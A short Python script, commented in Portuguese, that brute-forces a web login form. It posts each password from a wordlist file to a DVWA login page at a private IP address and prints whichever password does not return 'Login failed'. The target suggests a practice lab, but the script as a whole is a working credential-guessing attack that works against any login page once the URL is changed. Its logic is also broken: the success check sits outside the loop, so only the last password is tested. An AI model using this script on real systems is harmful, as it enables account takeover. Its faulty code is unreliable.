import requests

# define a página da web que você quer quebrar

# esta página deve ser uma página de login com nome de usuário e senha

url = "http://10.0.0.139/dvwa/login.php"

username = input("Qual é o nome de usuário que você deseja tentar? ")

# em seguida, vamos obter o arquivo de senha

password_file = "wordlist.txt"

# abra o arquivo de senha no modo de leitura

file = open(password_file, "r")

# agora vamos pegar cada senha no password_file

for password in file.readlines():

# vamos retira-lo de qualquer \n

    password = password.strip("\n")

# coletar os dados necessários de "inspecionar elemento"

    data = {'username':username, 'password':password, "Login":'submit'}

    send_data_url = requests.post(url, data=data)

if "Login failed" in str(send_data_url.content):

    print("[*] Attempting password: %s" % password)

else:

    print("[*] Password found: %s " % password)
